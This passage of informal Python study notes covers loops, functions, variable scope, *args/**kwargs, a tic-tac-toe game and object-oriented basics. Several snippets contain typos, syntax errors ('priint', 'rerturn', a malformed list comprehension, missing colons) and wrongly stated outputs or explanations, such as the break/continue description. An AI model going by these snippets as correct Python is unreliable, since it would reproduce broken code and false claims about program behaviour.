            print("See you again")
            return

studentData = getDataFromUser()

print(studentData)

#from statistics import mean

def getAvgMarks(D):
    avgMarks = {}
    for key, value in D.items():
        s= 0
        for num in value:
            s+=int(num)
        avgMarks[key] = s/len(value)
    
    return avgMarks 

avgM = getAvgMarks(studentData)

for x in avgM:
    print("Student with ID: {} has an avarage of {}".format(x, avgM[x]))

-----------------------------------------
pass keyword just python to MOVE ON

#students = {
        "Don":["ID001",10,"A"],
        "Ewe":["ID002",20,"B"],
        "Ama":["ID003",30,"C"],
        "Yaw":["ID004",40,"D"],
        "Afi":["ID005",50,"E"]
        }

students = {
        "Don":{"id":"ID001","age":10,"grade":"A"},
        "Ewe":{"id":"ID002","age":20,"grade":"B"},
        "Ama":{"id":"ID003","age":30,"grade":"C"},
        "Yaw":{"id":"ID004","age":40,"grade":"D"},
        "Afi":{"id":"ID005","age":50,"grade":"E"}
        }


print(students["Don"]["age"])

print(students["Emma"]["id"] , students["Emma"]["grade"])


------------------------------------------
WHILE LOOPS! (CONTROL FLOW)
------------------------------------------
repeats code over and over again while the condition is true.

while True:               #infinite iteration
	print("Hello")

	
while 2>1:                #infinite iteration becuase conditions remains true always
	print("Hello")


	
num = 1

while num <= 5:
    print(num)
    num = num + 1         # num += 1

print(" loop done")    
print(num)

>
1
2
3
4
5
 loop done 
6

L =[]

while len(L) < 3:
    new_name = input("Please add anew name: ").strip().capitalize()
    L.append(new_name)

print("Sorry, list is full")
print(L)

-----------------------------------------------------------------

from random import choice

while True: 
    #create a list of questions
    questions = ["Why is my name Kwame?: ","How old am i?: ","What is a television?: "]

    question = choice(questions)

    #prompt for baby to ask question

    answer = input(question).strip().lower()

    #want code to run when the answer is not "just because"

    while answer != "just because":
        print("Noooooooooo\n")
        answer = input("Why?: ")

    print("Oh.. Okay\n")
	
--------------------------------------------------------------------
FOR LOOPS
--------------------------------------------------------------------
#A for loop is used for iterating over a sequence (that is either a list, a tuple, a dictionary, a set, or a string)

type(range(6))
<class 'range'>

#In Python, range outputs a range iterable

#"for loops" are called iterators. Just like while loop, "For Loop" is also used to repeat the program. 
# But unlike while loop which depends on condition true or false.. For Loop iterates with number declared in the range.

range(6)
range(0, 6)

list(range(0, 6))
> [0,1,2,3,4,5]

list(range(0,10,2)):
> [0,2,4,6,8]

for number in range(1,4)
	print(number)
1
2
3

for item in "abcd"
	print(item)
a
b 
c 
d 

for number in [1,2,3,4]
	print(number)
1
2
3
4

#number(variable) becomes the next iterable in for loop

for number in range(1,7,2):
	print(number)
1
3
5

students = {'male': ['1', '2', '3'], 'female': ['Kate', 'Ann', 'Naa']} 

for value in students.values():
	for name in value:
		if "a" in name:
			print(name)
			
for  key in students.keys():
	for name in key:
		if "a" in name:
			print(name)
			
for key in students:
	for name in key:
		if "a" in name:
			print(name)
			
##same results

for key in students:
    print(key, students[key])

> male ['1', '2', '3']
  female ['Kate', 'Ann', 'Naa']

# finding the smallest number in a list
L = [2,1,3,-5,2,-6]

m = L[0]

for i in L:              #iterate through list L
    
    if i<m:
        m = i            #replace with new value
        
print(m)

# finding the largest number in a list
L = [2,1,3,-5,2,-6]

m = L[0]

for i in L:              #iterate through list L
    
    if i>m:
        m = i            #replace with new value
        
print(m)

#Sorting numbers of a list
L = [1,2,4,-5,7,9,3,2]
for j in range(len(L)):
    m = L[j]
    idx = j
    c = j
    for i in range(j,len(L)):
        if L[i]<m:
            m = L[i]
            idx = c
        c+=1    
    tmp = L[j]
    L[j] = m
    L[idx] = tmp
print(L)

# break will end the loop and continue will move onto the next iteration of the loop

num = [1,2,3,4,5]

for num in nums:
    if num == 3:
        print('Found!')
        break
    print(num)
> 1, 2, Found!

for num in nums:
    if num == 3:
        print('Found!')
        continue
    print(num)

> 1, 2, Found!
4, 5,

for num in nums:
    for letter in 'abc':
        print(num, letter)

> 1 a, 1 b, 1 c, 2 a, 2 b, 2 c, 3 a, 3 b, 3 c, 4 a, 4 b, 4 c, 5 a, 5 b, 5 c, 

x = 0

while x < 10:
    print(x, end=', ')
    x += 1

> 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 

x= 0

while x < 10:
    if x == 5:
        break 
    print(x) 
    x += 1 

> 0, 1, 2, 3, 4,



-------------------------------------------------------------------------
List comprehension
-------------------------------------------------------------------------
SHORT cut to combine for loops and if statement to create a list

even_numbers = [x for x in range(1,101) if x % 2 ==0]

odd_numbers = [x for x in range(1,101) if x % 2 !=0]

words = ["the","quick", "brown"]

answer = [[w.upper(),w.lower(),len(w) for w in words]

print(answer)

------------------------------------------------------------------------
BREAK, CONTINUE, PASS  (loop control statements)
------------------------------------------------------------------------
    else:
        vowel_pos = 0
        for letter in word:
            if letter not in "aeiou":
                vowel_pos = vowel_pos + 1
            else:
                break


the BREAK keyword breaks the loop and takes you back to the else statement

Whereas, the cCONTINUE keyword takes you to the loop above, in this case, the if statement

# Using loops in Python automates and repeats the tasks in an efficient manner

# The break statement is used to terminate the loop or statement in which it is present. 
After that, the control will pass to the statements that are present after the break statement,
if available.

# Python program to demonstrate break statement  
    
s = 'geeksforgeeks'
  
for letter in s:  
      
    if letter == 'e' or letter == 's':  
        break                             # break the loop as soon it sees 'e' or 's'
    
print("Out of for loop")  
print() 

# continue statement is opposite to that of break statement, 
instead of terminating the loop, it forces to execute the next iteration of the loop.
.When the continue statement is executed in the loop, the code inside the loop following the continue statement will be skipped 
and the next iteration of the loop will begin.

# Python program to demonstrate continue statement  
    
# loop from 1 to 10  
for i in range(1, 11):  
      
    if i == 6:  
        continue                   # if i is equals to 6,continue to next iteration without printing 
    else:           
        print(i, end = " ")        # otherwise print the value of i 

n = 10
i = 1
while True:
    if i%9 != 0:
        print("Inside loop")
        i += 1
        continue

    print("something")
    print("somethingelse")
    break

print("done")
		
#PASS STATEMENT simple DOES NOTHING. The pass statement in Python is used when a statement is required syntactically but you do not want any command or code to execute. 
#It is like null operation, as nothing will happen is it is executed. 
#Pass statement can also be used for writing empty loops.

# Python program to demonstrate 
# pass statement 
  
  
s = "geeks"
  
# Empty loop 
for i in s: 
    pass                          # No error will be raised
     
  
# Empty function 
def fun(): 
    pass                          # No error will be raised
  

fun()   
  
# Pass statement 
for i in s: 
    if i == 'k': 
        print('Pass executed') 
        pass
    print(i)

----------------------------------------------------
PIG LATIN TRANSLATOR
----------------------------------------------------
#get sentence from user
original = input("Enter a sentence: ").strip().lower()

#split sentence into words
words = original.split()
            
#loop through words and convert to pig latin

#if starts with vowel, just add "yay"

#Otherwise, move the first consonant cluster to the end, and add "ay"

new_words = []

for word in words:
    if word[0] in "aeiou":
        new_word = word + "yay"
        new_words.append(new_word)
    else:
        vowel_pos = 0
        for letter in word:
            if letter not in "aeiou":
                vowel_pos = vowel_pos + 1
            else:
                break
        cons = word[:vowel_pos]
        the_rest = word[vowel_pos:]
        new_word = the_rest + cons + "ay"
        new_words.append(new_word)

#stick back together
output = " ".join(new_words)

#output the final string
print(output)

-------------------------------------------------------
Functions                           DRY( Dont Repeat Yourself)
-------------------------------------------------------
#Functions is a block of organized and reusuable code that performs an action

#defining a function    def printMessage(inputArguments):

def functionName(params):                       # pass, so it doesnt throw error
    pass

# A python function always returns None if there is no return/print in the function
def hello_func():
    pass

print(hello_func)                                        # shows that content is in memory                       
print(hello_func())                                      # outputs None because no return or print function

> <function hello_func at 0x019FD7C8>
   None

def hello_func():
    print('Hello Function!')

hello_func()    
> Hello Function!

def hello_func():
    return 'Hello Function. '

print(hello_func())
> Hello Function.

print(hello_func().upper())                            #we can treat what it returns as data type
> HELLO FUNCTION!

def hello_func(greeting):                              # passing an argument to the function
    return f'{greeting} Function !'

print(hello_func('Hi'))
> Hi Function !

def hello_func(greeting, name='You'):                  # passing two arguments and setting the second arg with a default value
    return f'{greeting}, {name}'

print(hello_func('Hi'))                                # because the second value has a default value, you can call function with only one arg
> Hi, You

print(hello_func('Hi', name = 'Donald'))               # your required positional args have to come before your keyword args, or else, it will return arror
> Hi, Donald

def student_info(*args, **kwargs):                     # accept an arbitrary number of args and keyword args
    priint(args)
    print(kwargs)
student_info()
> ()                                                   # returns an emplty tuple
  {}                                                   # returns an empty string

student_info('Math', 'Art', name='John', age=22)
> ('Math', 'Art')
  {'name': 'John', 'age': 22}

courses = ['Math', 'Art']
info = {'name': 'John', 'age': 22}

student_info(courses, info)
> (['Math', 'Art'], {'name': 'John', 'age': 22})                    # unpacks courses and info as arguments, and returns empty dict
{}

student_info(*courses, **info)
> ('Math', 'Art')
{'name': 'John', 'age': 22}

# Number of days per month. First value placeholder for indexing purposes.
month_days = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]


def is_leap(year):
    """Return True for leap years, False for non-leap years."""

    return year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)


def days_in_month(year, month):
    """Return number of days in that month in that year."""

    if not 1 <= month <= 12:
        return 'Invalid Month'

    if month == 2 and is_leap(year):
        return 29

    return month_days[month]

print(is_leap(2000))
> True

def add(x,y):
	return x + y

print(add(5,3))                                      #calling a function and returns a value
> 8                                             

# can store in a variable
answer = add(100,20)
print(answer )
> 120

# returning a value != printing a value
# returning stores in variable name in memory, print just displays the output on screen
#return makes a local variable accessible outside the function

a= print("hello")
type(a)
<class 'NoneType'>

def rev(text):
	return text[::-1]
	
rev('pen')

rev([1,2,3,4])

#USING docstring with function 
def printSuccess():
    """This function is returns Hello world when called"""
    rerturn "Hello World"

printSuccess()        #to call function

help(printSuccess)                  # returns the docstring in the function

#using return without an argument works like a break function
def h():
    print("A")
    a = 3
    b = 5
    print("something")
    return              #acts as break
    print("B")

def f():
    a = 5
    b = 7
    d = "something"
    return a,b,d        #can return multipel values


#function(default values)
def f(sum=0):
    print(sum)

f() #returns the default,0 

----------------------------------------------------
Variable Scope( Global scope and local scope) LEGB
----------------------------------------------------
# LEGB      # local, Enclosing, Global, Built-in
# Scope refers to the visibility of variables
# variable scope determines where our variables can be accessed from within the program and whta values those variables hold in different contexts

# A variable declared inside the function's body or in the local scope is known as a local variable.

# global variables are defined at the top level of a module or explicitly declared global using the global keyword

# Enclosing (or nonlocal) scope is a special scope that only exists for nested functions. If the local scope is an inner or nested function, then the enclosing scope is the scope of the outer or enclosing function.

# Built-ins are just names that are preassigned in Python. the special reserved keywords fall under this scope. We can call the keywords anywhere within our program without having to define them before use. e.g try, finally, lambda, return , yield

# Flow of checks > local, enclosing, global and built-in

x = 'global x'                   # global variable because its in the main body of our file

def test():
    x = 'local x'                # y is a local variable to the test function
    print(x)

test()
> local x                       # prints out the local x 


def test():
    y = 'local y'
    print(x)

test()                          # prints out the global x, because there is no local and enclosing x           
> global x

print(y)                       # returns error because it doesnt find y in the global or built-in
print(x)                       # returns the global variable

def test():
    x = 'local x'
    print(x)

test()
print(x)

> local x
  global x 

def test():
    global x                      # set the global variable to x
    x= 'local x'
    print(x)

test()
print(x)
> local x
  local x 

def test(z):
    x = 'local x'
    print(z)

test('local z')
print(z)

> local z 
   error 

import builtins
print(dir(builtins))

print(dir(__builtins__))
> ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

# enclosing variable scope
x = 'global x'                   # global scope 

def outer():
    x = 'outer x'                # enclosing scope 

    def inner():
        x = 'inner x'            # inner scope     # if commented out, falls back to the enclosing scope 
        print(x)
    
    inner()
    print(x)

outer()
> inner x
  outer x
  global x



x = 'global x'                   # global scope 

def outer():
    x = 'outer x'                # enclosing scope 

    def inner():
        nonlocal x               # set this variable as an enclosing scope
        print(x)
    
    inner()
    print(x)

outer()
> outer x
  outer x
  global x
 
# global scope
#If a variable is in global scope, its called global varible and can be seen everywhere.

#Functions create local scope , whereas LOOPS AND IF STATEMENTS DON'T CREATE LOCAL SCOPE

a =100   #global scope

def f1():
	print(a)

def f2():
	print(a)
	
f1()
f2()
	
100     # because a is global variable
100
--------------

	print(a)

def f2():
	print(a)
	
f1()
f2()

f2() returns error because variable a is local to function f1() only

------------------
a = 250

def f1():
	a = 100
	print(a)
	
def f2():
	a = 50
	print(a)

f1()
f2()
print(a)

100
50
250
---------------------
a = 250

def f1():
	b = a + 10    
	print(b)
	
def f2():
	a = 50      #local
	print(a)

f1()
f2()
print(a)

260
50
250
----------------------------
CHANGING THE GLOBAL VALUE
----------------------------
a = 250

def f1():
	global a    #you can't write global a = 100
	a = 100     #global
	print(a)
	
def f2():
	a = 50      #local
	print(a)

f1()
f2()
print(a)

100
50
100

-------------------
a = [1,2,3,4]

def f1():
	a = 10     # global
	print(a)
	
def f2():
	a = 50      # local
	print(a)

f1()
f2()
print(a)

10
50
[1,2,3,4]

--------------------
a = [1,2,3]

def f1():
	a[0] = 5     #global
	print(a)
	
def f2():
	a = 50      #local
	print(a)

f1()
f2()
print(a)

[5,2,3]
50
[5,2,3]  # the global value also change because we change the global value


---------------------------------------------------------------
KEYWORD ARGUMENTS & DEFAULT PARAMETERS
---------------------------------------------------------------

def about(name, age, likes):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
	
about("Jack", 23 ,"Python")
#positional word argument

#argument "Jack" matches to parameter name
#argument 23 matches to parameter age
#argument "Python" matches to parameter likes

about(age = 23, name = "Jack", likes = Python")

#keyword arguments, each argument is associated with a keyword, which matches the marameter in the function definition
#keyword argument has more flexiblity

def about(name, age, likes = "Python"):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
	
about("Jack",23)
Meet Jack! They are 23 years old and they like Python

about("Jack",23,"Football")
Meet Jack! They are 23 years old and they like Football

#default parameters must go to the end

def about(name = "Don", age = 23, likes = "Python"):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
 
about()
Meet Don! They are 23 years old and they like Python

-------------------------------------------------------------------
PACKING AND UNPACKING USING ARGS AND KWARGS( * args and **kwargs)
-------------------------------------------------------------------
overview and review

print(1,2,3,4,5)    #passing 5 arguments to the print function
>>>  1 2 3 4 5

numbers = [1,2,3,4,5]
print(numbers)		#passing 1 argument to the print function
>>>  [1,2,3,4,5]

#unpacking the argument 
print(*numbers)
>>>  1 2 3 4 5

print("abc")
abc

print(*"abc")
a b c 

print("a","b","c")
a b c 

def add(x,y):
	return x + y 
	
add(10,10)
20

*args
def add(*numbers):  #pack in as many numbers as possible 
					#pack the args into one tuple
					#tuples are iterable, so we can iterate through them and add them
					#packing is useful when you do not know how many arguments you are expecting
					#making it flexible
						
	return

def add(*numbers):       # def add(*args):
	total = 0
	for number in numbers:
		total = total + number
	return(total)   
	
add(1,2,3,4,5,6,7,8,9)
45

#same as 
numbers = add(1,2,3,4,5,6,7,8,9)

def add(*args):
    sum = 0
    for i in range(len(args)):
        sum+=args[i]
    return sum

--------------------------------------------------------------
def about(name, age, likes):
	sentence = "Meet {}! They are {} years old and they like {}".format(name, age, likes)
	return sentence
	
dictionary = {"name":"Ziyad","age":23,"likes" = "Python"}
about(**dictionary)
Meet {}! They are {} years old and they like {}
#that unpacks all the keywrd arguments

about(name= "Ziyad", age = 23, likes = "Python")
Meet {}! They are {} years old and they like {} 


def foo(**kwargs):    #when we pack som arguments, we going to create a dictionary out of them
		for key, value in kwargs.items()       #set of tuple, each has a key and value			
			print("{}.{}".format(key, value)
			

foo(huda = "Female",ziyad = "male")
ziyad:male
huda:Female


def printAllVAriables(**kwargs):
    for x in kwargs:
        print("Variable Name is :",x," And Value is :", kwargs[x])

printAllVAriables(a=3,b = "b",d =7.0)
---------------------------------------------------------------
board = [" "] * 9

def print_board():
    row1 = "|{}|{}|{}|".format(board[0], board[1], board[2])
    row2 = "|{}|{}|{}|".format(board[3], board[4], board[5])
    row3 = "|{}|{}|{}|".format(board[6], board[7], board[8])

    print()
    print(row1)
    print(row2)
    print(row3)
    print()


def player_move(icon):

    if icon == "X":
        number = 1
    elif icon == "Y":
        number = 2
        
    print("Your turn player {}".format(number))
    
    choice = int(input("Enter your number(1-9): ").strip())
    if board[choice-1] == " ":
       board[choice-1] = icon
    else:
        print()
        print("That space is taken!")

def is_victory(icon):
    if (board[0] == icon and board[1] == icon and board[2] == icon) or\
       (board[3] == icon and board[4] == icon and board[5] == icon) or\
       (board[6] == icon and board[7] == icon and board[8] == icon) or\
       (board[0] == icon and board[3] == icon and board[6] == icon) or\
       (board[1] == icon and board[4] == icon and board[7] == icon) or\
       (board[2] == icon and board[5] == icon and board[8] == icon) or\
       (board[0] == icon and board[1] == icon and board[2] == icon) or\
       (board[0] == icon and board[1] == icon and board[2] == icon):
        return True
    else:
        return False

def is_draw():
    if " " not in board:
        return True
    else:
        return False

while True:
    print_board()
    player_move("X")
    print_board()
    if is_victory("X"):     #using a function as an boolean expression
        print("X Wins! Congratulations!")
        break
    elif is_draw():
        print("Its a draw!")
        break
    
    player_move("Y")
    if is_victory("Y"):
        print_board()
        print("Y Wins! Congratulations!")
        break
     elif is_draw():
        print("Its a draw!")
        break


----------------------------------------------------------------
MODULES 
----------------------------------------------------------------
a PYTHON file that contians functions,variables, classes that can be resuable in a different code


---module ----

def checkIfNotNumeric(*args):
    
    for x in args:
        if not(isinstance(x,(int,float))):
            return False
    return True

def addAllNumerics(*args):
    s = 0
    for x in args:
        s+=x
    return s


myName = "Python COurse"

---code----
import sys
sys.path.append('D:/mymodules/')
import myfuncs as f 

f.printMe('hellow')

c = myfs.addAllNumerics(2,3,4,6)

print(c)

------------------

def findMin(L,startIndx):
    """ Function to return minimum number and index """
    m = L[startIndx]
    idx = startIndx    
    for i in range(startIndx,len(L)):
        x = L[i]
        if x<m:
            m = x
            idx = i
        else:
            pass                
    return m,idx

def swapValues(L,idx1,idx2):
    """ Function to swap elements in list """
    L[idx2],L[idx1] = L[idx1], L[idx2]
    return L

#print(swapValues([1,2,3,4,5],1,3))

def checkIfNotNumeric2(L): 

    for x in L:
        if not(isinstance(x,(int,float))):
            return False
    return True

def sortList(L):
    if not(checkIfNotNumeric2(L)):
        print("Error: List does not contain numeric values")
        return
    else:
        c = 0
        for x in L:
            m,idx = findMin(L,c)
            L = swapValues(L,c,idx)
            c+=1
    return L


print(sortList([2,1,3,4,-5,-6]))

---------------------------------------------------------------------
OBJECT ORIENTED PROGRAMMING(O.O.P)
---------------------------------------------------------------------
# Classes allow us to group our data and functions in a way thats easy to reuse and also easy to build upon if need be .
# A method is a function that is associated with a class
# using a class to create a blueprint to create each employee so that we didnt have to do this manually from scratch
# our class is a blueprint for creating instances and each unique employee that we create using our employee class will be an instance of that 


class Employee:
    pass

emp_1 = Employee()                                      # creating an object/instance of the class Employee
emp_2 = Employee() 

print(emp_1)                                            # emp_1 and emp_2 will be their own unique instance of Employee class
print(emp_2)
print()

emp_1.first = "Corey"                                   # setting values to the attributes/properties of the instamce of class Employee
emp_1.last = 'Schafer'
emp_1.email = 'corey.schafer@company.com'
emp_1.pay = 50000

emp_2.first = "Test"                                    # assigning values to the attributes of the unique  of class Employee
emp_2.last = "User"
emp_2.email = "Test.User@company.com"
emp_2.pay = 60000

print(emp_1.email)                                       # getting the attribute of the instance of class Employee
print(emp_2.email)

<__main__.Employee object at 0x038301F0>                         
<__main__.Employee object at 0x038302D0>

> corey.schafer@company.com
> Test.User@company.com

# set all these info/data for these employess, setting it manually is a lot of code and its also prone to mistakes 

# so we automate by using __init__ method (constructor/initializer)

# When we create methods within a class, they receive the instance as the first argument
# By convention , we call the instance self    [def __init__(self, first, last, pay):]
# After self, we can pass other arguments thatwe want to accept

class Employee:
    
    num_of_emps = 0
    raise_amount = 1.04                                           # class variable shared among all instances

    def __init__(self, first, last, pay):
        self.first =  first                                        #setting attribute / instance variables
        self.last = last 
        self.pay = pay 
        self.email = first + '.' + last + '@company.com'

        Employee.num_of_emps += 1                                 # using class Employee in this case is beneficial than self

    def fullname(self):
        return f'{self.first} {self.last}'

    def apply_raise(self):
        self.pay = int(self.pay * self.raise_amount)              # using self allows any subclass to to oveeride that constant if they want to

emp_1 = Employee('Donald', 'Decker', 50000)       # when u create our employee down here,instance is passed automatically,we can leave off self
emp_2 = Employee('Test', 'User', 60000) 


print(emp_1.email)
print(emp_2.email)

print(emp_1.fullname())                             # we use () because it is a method, and not an attribute
print(emp_2.fullname())
print(Employee.fullname(emp_1))

> corey.schafer@company.com
> Test.User@company.com
> Donald Decker
> Test User

# we can use this format to print out fullname
print(f'{emp_1.first} {emp_1.last})       > Donald Decker

# but we can efficiently create a method within our class that allows us to put a functionality in one place 

# print(emp_2.fullname())  == print(Employee.fullname(emp_1)) ;  works similar. thats how its working in the background
passing an arg emp_1 to the method (fullname) of class Employee to return the fullname 


--------------------------------------------------------
Class Variables
--------------------------------------------------------
# Class variables are variables that are shared among all the instances of a class so while instance variable can be unique for each instance like our names and email. Class variables should be the same 

# when we access these class variables , we need to access through the class itself or an instance of the class (Employee.raise_amount or self.raise_amount)

# when we try to access an attribute on an instance it will first check if the instance contains that attribute and if it doesnt then it eill see if the class or any class that it inherits from conatins that attribute 

# to see the namespace of the instance variable 
print(emp_1.__dict__) 
> {'first': 'Donald', 'last': 'Decker', 'pay': 50000, 'email': 'Donald.Decker@company.com'}

--------------------------------------------------
CLASS METHODS AND STATIC METHODS
--------------------------------------------------
Regular methods and class automatically take the instance as the first argument(self by convention).
# We can change it to take the class as the first argument using class methods
# To turn a regular method into a class method, it is easy as adding a decorator to the top

# decorator is altering the functionality of our method to where now we receive the class as our first argument instead of the instance now 

#cls is the name convention for class variable name 

classmethod(function) -> method

Convert a function to be a class method.

A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom:

  class C:
      @classmethod def f(cls, arg1, arg2, ...):

@classmethod
def set_raise_amt(cls, amount):
    cls.raise_amt = amount 

-----------------------------------
STATIC METHODS
-----------------------------------
# static method don't pass the instance or the class automatically, so they behave just like regular functions
but included because they have logical connection to our class

# Convert a function to be a static method.

# A static method does not receive an implicit first argument.

@staticmethod
    def is_workday(day):
        if day.weekday() == 5 or day.weekday() == 6:
            return False
        return True


-----------------------------------------------------
INHERITANCE- CREATING SUBCLASSES
-----------------------------------------------------
# Inheritance allows us to define a class that inherits all the methods and properties from another class.
# Parent class is the class being inherited from, also called base class.
# Child class is the class that inherits from another class, also called derived class.

# Create a class named Person, with firstname and lastname properties(attributes), and a printname method:
class Person:
  def __init__(self, fname, lname):
    self.firstname = fname
    self.lastname = lname

  def printname(self):
    print(self.firstname, self.lastname)

# Use the Person class to create an object, and then execute the printname method:

x = Person("John", "Doe")
x.printname()
>  John Doe

# Create a class named Student, which will inherit the properties and methods from the Person class:

class Student(Person):
  pass

# Use the Student class to create an object, and then execute the printname method:

x = Student("Mike", "Olsen")
x.printname()

help(Student)                                   # shows you the method resolution order, inti method, apply raise mathod, class variables

# When you add the __init__() function, the child class will no longer inherit the parent's __init__() function.

# To keep the inheritance of the parent's __init__() function, add a call to the parent's __init__() function:
class Student(Person):
  def __init__(self, fname, lname):
    Person.__init__(self, fname, lname)

# Python also has a super() function that will make the child class inherit all the methods and properties from its parent:
class Student(Person):
  def __init__(self, fname, lname):
    super().__init__(fname, lname)

# Add a property called graduationyear to the Student class:
class Student(Person):
  def __init__(self, fname, lname, year):
    super().__init__(fname, lname)
    self.graduationyear = year

x = Student("Mike", "Olsen", 2019)   

# by changing the raise amount in our subclass, it doesnt have any effect on our parent class


1. What is inheritence?
It is a method that allows us to create a new class that shares the same attributes and method with the original function, and add some extra functionality to the new class. It also does not disturb the original class.


2. How to make a class inherit from another class?
class Developer(Employee):


3. Structure of classes and subclasses.
When we input a function to a subclass, python follows the 'method resolution order', which is the chain of classes that it goes through to find what the method is. All classes have the built-in group of methods and attributes as their primary order.


4. How to initiate the subclass so that it can handle more information than its original class can?
There are 2 ways.
first, using the super method as follows and pass in the arguments in interest.
super.__init__()


Second, call the parent's init method explicitly and pass in the arguments in interest.
Employee.init(self, first, last, )


5. Useful tools when exploring the inheritance system.
.isinstance(instance, class)
This method returns the boolean value of whether an instance belongs to a calss
.issubclass(subclass, class)
This method returns the boolean value of whether a class has inherited from the second class.


6. Example of class inheritance
Whisky library 

++ when setting a default value for an ungiven argument, avoid using an empty mutable data type.

class Employee:

    raise_amt = 1.04

    def __init__(self, first, last, pay):
        self.first = first
        self.last = last
        self.email = first + '.' + last + '@email.com'
        self.pay = pay

    def fullname(self):
        return '{} {}'.format(self.first, self.last)

    def apply_raise(self):
        self.pay = int(self.pay * self.raise_amt)


class Developer(Employee):
    raise_amt = 1.10

    def __init__(self, first, last, pay, prog_lang):
        super().__init__(first, last, pay)
        self.prog_lang = prog_lang


class Manager(Employee):

    def __init__(self, first, last, pay, employees=None):
        super().__init__(first, last, pay)
        if employees is None:
            self.employees = []
        else:
            self.employees = employees

    def add_emp(self, emp):
        if emp not in self.employees:
            self.employees.append(emp)

    def remove_emp(self, emp):
        if emp in self.employees:
            self.employees.remove(emp)

    def print_emps(self):
        for emp in self.employees:
            print('-->', emp.fullname())


dev_1 = Developer('Corey', 'Schafer', 50000, 'Python')
dev_2 = Developer('Test', 'Employee', 60000, 'Java')

mgr_1 = Manager('Sue', 'Smith', 90000, [dev_1])

print(mgr_1.email)

mgr_1.add_emp(dev_2)
mgr_1.remove_emp(dev_2)

mgr_1.print_emps()

----------------------------------------------------------
SPECIAL (DUNDER/MAGIC) METHODS
----------------------------------------------------------
__init__ = dunder init method
When a new object is made, it is initialized by calling the __init__ method on the object. __init__ is pronounced “dunder init”: dunder is short for “double-underscore”. The new object is passed as self, and the arguments to the class are passed as arguments after self.

__repr__ 
is to be an unambiguos representaion of the object and should be used for debugging and logging

__str__
is to be more of a readable representation of an object and meant to be used as a display to the end-user 

str() is used for creating output for end user while repr() is mainly used for debugging and development. repr’s goal is to be unambiguous and str’s is to be readable.

class Employee:

    raise_amt = 1.04

    def __init__(self, first, last, pay):
        self.first = first
        self.last = last
        self.email = first + '.' + last + '@email.com'
        self.pay = pay

    def fullname(self):
        return '{} {}'.format(self.first, self.last)

    def apply_raise(self):
        self.pay = int(self.pay * self.raise_amt)

    def __repr__(self):
        # return "Employee('{}', '{}', {})".format(self.first, self.last, self.pay)
        return f"Employee('{self.first}', '{self.last}', {self.pay})"

    def __str__(self):
        # return '{} - {}'.format(self.fullname(), self.email)
        return f'{self.fullname()} - {self.email}'

    def __add__(self, other):
        return self.pay + other.pay

    def __len__(self):
        return len(self.fullname())


emp_1 = Employee('Corey', 'Schafer', 50000)
emp_2 = Employee('Test', 'Employee', 60000)

print(emp_1 + emp_2)

print(emp_1.__repr__())
print(emp_1.__str__())

print(repr(emp_1))
print(str(emp_1))
print(list.__add__([1,2],[3,4]))

print(len(emp_2))

----------------------------------------------------------
Property Decorators - Getters, Setters, and Deleters
----------------------------------------------------------
Use @property decorator on any method in the class to use the method as a property.

You can use the following three decorators to define a property:

@property: Declares the method as a property.
@<property-name>.setter: Specifies the setter method for a property that sets the value to a property.
@<property-name>.deleter: Specifies the delete method as a property that deletes a property.

class Employee:

    def __init__(self, first, last):
        self.first = first
        self.last = last

    @property                                       # function to be used for getting an attribute value
    def email(self):                                # problem is it will break the code everytime you need to make a change
        return f'{self.first}.{self.last}@email.com'
        
    @property
    def fullname(self):
        return '{} {}'.format(self.first, self.last)
    
    @fullname.setter                               # function to be used for setting an attribute value
    def fullname(self, name):
        first, last = name.split(' ')
        self.first = first
        self.last = last
    
    @fullname.deleter                               # function to be used for del'ing an attribute
    def fullname(self):
        print('Delete Name')
        self.first = None
        self.last = None


emp_1 = Employee('Corey', 'Schafer')
emp_1.first = 'donald'
emp_1.fullname = 'Meggy Ohio'

print(emp_1.first)
print()
print(emp_1.email)
print()
print(emp_1.fullname)
print()
del emp_1.fullname
print(emp_1.fullname)








#each template to make a coin in program is a CLASS

# Class -> Object

# Object is an instance of a class

# Object have states and actions(behaviors) they can do

